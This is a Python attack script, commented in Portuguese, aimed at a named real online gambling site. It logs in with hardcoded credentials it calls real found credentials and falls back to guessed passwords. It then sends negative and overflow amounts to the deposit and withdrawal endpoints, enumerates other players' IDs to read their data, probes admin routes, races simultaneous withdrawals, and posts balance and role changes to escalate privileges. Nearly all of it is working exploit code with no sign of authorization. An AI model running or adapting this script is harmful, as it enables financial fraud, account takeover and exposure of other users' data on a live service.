"""
1. Login com as credenciais reais encontradas
2. Obter token fresco
3. Rodar todos os ataques com o token válido
"""
import urllib.request, ssl, json, uuid, threading, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

BASE   = "https://ds.amizade777.com"
PKG    = "com.slots.big"
PHONE  = "21998498419"
PWD    = "21998498419"
DID    = "0beb614f-8838-43ef-00fc-0029f7d5d20f"  # deviceId real da requisição

def post(path, data, token=None):
    body = json.dumps(data).encode()
    h = {
        "User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Accept":       "*/*",
        "Origin":       BASE,
        "Referer":      BASE + "/",
    }
    if token:
        h["token"] = token
    try:
        r = urllib.request.Request(BASE + path, data=body, headers=h, method="POST")
        with urllib.request.urlopen(r, timeout=15, context=ctx) as resp:
            raw = resp.read(8192).decode("utf-8","ignore")
            return resp.status, dict(resp.headers), json.loads(raw)
    except urllib.error.HTTPError as e:
        try:    return e.code, {}, json.loads(e.read(4096).decode("utf-8","ignore"))
        except: return e.code, {}, {}
    except Exception as ex:
        return 0, {}, {"err": str(ex)}

def get(path, token=None):
    h = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept":     "application/json, */*",
        "Origin":     BASE,
        "Referer":    BASE + "/",
    }
    if token:
        h["token"] = token
    try:
        r = urllib.request.Request(BASE + path, headers=h)
        with urllib.request.urlopen(r, timeout=15, context=ctx) as resp:
            raw = resp.read(8192).decode("utf-8","ignore")
            return resp.status, dict(resp.headers), json.loads(raw)
    except urllib.error.HTTPError as e:
        try:    return e.code, {}, json.loads(e.read(4096).decode("utf-8","ignore"))
        except: return e.code, {}, {}
    except Exception as ex:
        return 0, {}, {"err": str(ex)}

# ═══════════════════════════════════════════════════════
print("=" * 60)
print("PASSO 1 — LOGIN COM CREDENCIAIS REAIS")
print("=" * 60)

login_payload = {
    "appChannel":     "pc",
    "appPackageName": PKG,
    "deviceId":       DID,
    "deviceModel":    "WEB",
    "deviceVersion":  "WEB",
    "appVersion":     "1.0.0",
    "sysTimezone":    None,
    "sysLanguage":    None,
    "phone":          PHONE,
    "password":       PWD,
}

st, hdrs, body = post("/prod-api/player/sign-in", login_payload)
code = body.get("code","?")
msg  = body.get("msg","")
print(f"  HTTP={st} code={code} msg={msg!r}")

TOKEN = None
MY_UID = None

if code == 200:
    data = body.get("data") or {}
    TOKEN  = data.get("token") or body.get("token")
    MY_UID = data.get("id") or data.get("userId") or data.get("user_id")
    print(f"  *** LOGIN OK! ***")
    print(f"  Token:  {TOKEN}")
    print(f"  UserID: {MY_UID}")
    print(f"  Data:   {json.dumps(data, ensure_ascii=False)[:400]}")
else:
    print(f"  Login falhou. Tentando outros formatos...")
    # Tentar com senha diferente
    for pwd_alt in [PHONE[-6:], "123456", "admin", PHONE]:
        login_payload["password"] = pwd_alt
        st2, _, body2 = post("/prod-api/player/sign-in", login_payload)
        code2 = body2.get("code","?")
        msg2  = body2.get("msg","")
        print(f"  pwd={pwd_alt!r} -> code={code2} msg={msg2!r}")
        if code2 == 200:
            data2  = body2.get("data") or {}
            TOKEN  = data2.get("token")
            MY_UID = data2.get("id") or data2.get("userId")
            print(f"  *** LOGIN OK com pwd={pwd_alt!r}! Token: {TOKEN}")
            break
        time.sleep(1)

if not TOKEN:
    print("\nNão foi possível fazer login automaticamente.")
    print("Use o token do localStorage se disponível.")
    TOKEN = input("Cole o token aqui (ou Enter para pular): ").strip() or None

if not TOKEN:
    print("Sem token — encerrando.")
    exit(0)

print(f"\nToken ativo: {TOKEN}")
print(f"User ID: {MY_UID}")

# ═══════════════════════════════════════════════════════
print("\n" + "=" * 60)
print("PASSO 2 — INFO DO USUÁRIO E SALDO")
print("=" * 60)

for path in [
    "/prod-api/player/info",
    "/japi/user/balance/querySimpleBalance",
    "/prod-api/vip/info",
    "/prod-api/pay-service/withdraw-limit",
    "/prod-api/pay-service/recharge-list",
]:
    st, _, body = get(path, TOKEN)
    code = body.get("code","?")
    data = body.get("data","")
    msg  = body.get("msg","")
    flag = " *** OK ***" if code == 200 else ""
    print(f"  [{st}] {path} code={code}{flag}")
    if code == 200 and data:
        print(f"    DATA: {json.dumps(data, ensure_ascii=False)[:300]}")

# ═══════════════════════════════════════════════════════
print("\n" + "=" * 60)
print("PASSO 3 — MANIPULAÇÃO DE DEPÓSITO")
print("=" * 60)

deposit_tests = [
    {"amount": -100,             "note": "Negativo -100"},
    {"amount": -1,               "note": "Negativo -1"},
    {"amount": 0,                "note": "Zero"},
    {"amount": 0.000000001,      "note": "Fracionário extremo"},
    {"amount": 9007199254740991, "note": "MAX_SAFE_INTEGER"},
    {"amount": -100, "money": -100, "note": "Duplo negativo"},
]

for path in ["/prod-api/pay-service/recharge", "/prod-api/global-config/recharge"]:
    for test in deposit_tests:
        note = test.pop("note")
        payload = dict(test, appPackageName=PKG, deviceId=DID)
        st, _, body = post(path, payload, TOKEN)
        code = body.get("code","?")
        msg  = body.get("msg","")
        if st not in (0,404,405):
            flag = " *** ACEITO! VULNERÁVEL! ***" if code == 200 else ""
            print(f"  {path} [{note}] code={code} msg={msg!r}{flag}")
            if code == 200:
                print(f"    DATA: {json.dumps(body.get('data',{}), ensure_ascii=False)[:400]}")
        test["note"] = note
        time.sleep(0.3)

# ═══════════════════════════════════════════════════════
print("\n" + "=" * 60)
print("PASSO 4 — MANIPULAÇÃO DE SAQUE")
print("=" * 60)

withdraw_tests = [
    {"amount": -100,             "note": "Negativo -100 (credita?)"},
    {"amount": -1,               "note": "Negativo -1"},
    {"amount": 0,                "note": "Zero"},
    {"amount": 0.000000001,      "note": "Fracionário extremo"},
    {"amount": 9007199254740991, "note": "MAX_SAFE_INTEGER"},
    {"amount": 1,                "note": "Normal 1 (baseline)"},
]

for path in ["/prod-api/payment/balance-less", "/prod-api/pay-service/withdraw"]:
    for test in withdraw_tests:
        note = test.pop("note")
        payload = dict(test, appPackageName=PKG, deviceId=DID)
        st, _, body = post(path, payload, TOKEN)
        code = body.get("code","?")
        msg  = body.get("msg","")
        if st not in (0,404,405):
            flag = " *** ACEITO! VULNERÁVEL! ***" if code == 200 else ""
            print(f"  {path} [{note}] code={code} msg={msg!r}{flag}")
            if code == 200:
                print(f"    DATA: {json.dumps(body.get('data',{}), ensure_ascii=False)[:400]}")
        test["note"] = note
        time.sleep(0.3)

# ═══════════════════════════════════════════════════════
print("\n" + "=" * 60)
print("PASSO 5 — IDOR: ACESSAR OUTROS USUÁRIOS")
print("=" * 60)

my_uid_int = int(MY_UID) if MY_UID and str(MY_UID).isdigit() else 137027
print(f"  Meu UID: {my_uid_int}")

uids = sorted(set([1, 2, 3, 100, 1000, my_uid_int-2, my_uid_int-1,
                   my_uid_int+1, my_uid_int+2, 137000, 137001, 137028]))

for uid in uids:
    for tmpl in [
        "/prod-api/player/{}",
        "/prod-api/player/info?id={}",
        "/japi/user/player/{}",
    ]:
        path = tmpl.format(uid)
        st, _, body = get(path, TOKEN)
        code = body.get("code","?")
        if code == 200:
            data = body.get("data",{})
            print(f"  *** IDOR [{st}] {path}")
            print(f"      DATA: {json.dumps(data, ensure_ascii=False)[:400]}")
        elif st not in (0,404,405,403) and code not in ("?",102008,102009,400):
            print(f"  [{st}] {path} -> code={code} msg={body.get('msg','')!r}")
    time.sleep(0.3)

# ═══════════════════════════════════════════════════════
print("\n" + "=" * 60)
print("PASSO 6 — ACESSO AO PAINEL ADMIN")
print("=" * 60)

admin_paths = [
    "/prod-api/admin/player/list",
    "/prod-api/admin/user/list",
    "/prod-api/admin/finance",
    "/prod-api/admin/recharge/list",
    "/prod-api/admin/withdraw/list",
    "/prod-api/admin/config",
    "/prod-api/admin/system",
    "/prod-api/superadmin/player/list",
    "/japi/admin/user/list",
    "/japi/admin/finance",
    "/japi/manage/user",
]

for path in admin_paths:
    st, _, body = get(path, TOKEN)
    code = body.get("code","?")
    msg  = body.get("msg","")
    if st not in (0,404,405,403) or code == 200:
        flag = " *** ADMIN ACESSÍVEL! ***" if code == 200 else ""
        print(f"  [{st}] {path} -> code={code} msg={msg!r}{flag}")
        if code == 200:
            print(f"    DATA: {json.dumps(body.get('data',{}), ensure_ascii=False)[:400]}")
    time.sleep(0.3)

# ═══════════════════════════════════════════════════════
print("\n" + "=" * 60)
print("PASSO 7 — RACE CONDITION: 5 SAQUES SIMULTÂNEOS")
print("=" * 60)

resultados = []
lock = threading.Lock()

def saque(n, valor=1):
    payload = json.dumps({"amount": valor, "appPackageName": PKG, "deviceId": DID}).encode()
    h = {
        "User-Agent":   "Mozilla/5.0",
        "Content-Type": "application/json",
        "token":        TOKEN,
        "Origin":       BASE,
        "Referer":      BASE + "/",
    }
    try:
        r = urllib.request.Request(BASE + "/prod-api/payment/balance-less",
                                   data=payload, headers=h, method="POST")
        with urllib.request.urlopen(r, timeout=15, context=ctx) as resp:
            result = (resp.status, json.loads(resp.read(4096).decode("utf-8","ignore")))
    except urllib.error.HTTPError as e:
        try:    result = (e.code, json.loads(e.read(2048).decode("utf-8","ignore")))
        except: result = (e.code, {})
    except Exception as ex:
        result = (0, {"err": str(ex)})
    with lock:
        resultados.append((n, result[0], result[1]))

threads = [threading.Thread(target=saque, args=(i, 1)) for i in range(5)]
for t in threads: t.start()
for t in threads: t.join(timeout=20)

ok_count = sum(1 for _, _, b in resultados if b.get("code") == 200)
print(f"  {len(resultados)} respostas | {ok_count} aceitas (code=200)")
for n, st, body in resultados:
    code = body.get("code","?")
    msg  = body.get("msg","")
    flag = " *** ACEITO ***" if code == 200 else ""
    print(f"  Thread {n}: HTTP={st} code={code} msg={msg!r}{flag}")
    if code == 200:
        print(f"    DATA: {json.dumps(body.get('data',{}), ensure_ascii=False)[:300]}")

if ok_count >= 2:
    print("  *** RACE CONDITION CONFIRMADA ***")

# ═══════════════════════════════════════════════════════
print("\n" + "=" * 60)
print("PASSO 8 — ESCALADA DE PRIVILÉGIO")
print("=" * 60)

for path, payload in [
    ("/prod-api/player/update", {"balance": 999999, "vipLevel": 99}),
    ("/prod-api/player/update", {"role": "admin", "isAdmin": True}),
    ("/prod-api/player/update", {"id": 1, "balance": 999999}),  # IDOR write
]:
    st, _, body = post(path, payload, TOKEN)
    code = body.get("code","?")
    msg  = body.get("msg","")
    if st not in (0,404,405):
        flag = " *** ACEITO! ***" if code == 200 else ""
        print(f"  [POST {st}] {path} -> code={code} msg={msg!r}{flag}")
        if code == 200:
            print(f"    DATA: {json.dumps(body.get('data',{}), ensure_ascii=False)[:400]}")
    time.sleep(0.5)

print("\n\nConcluído.")
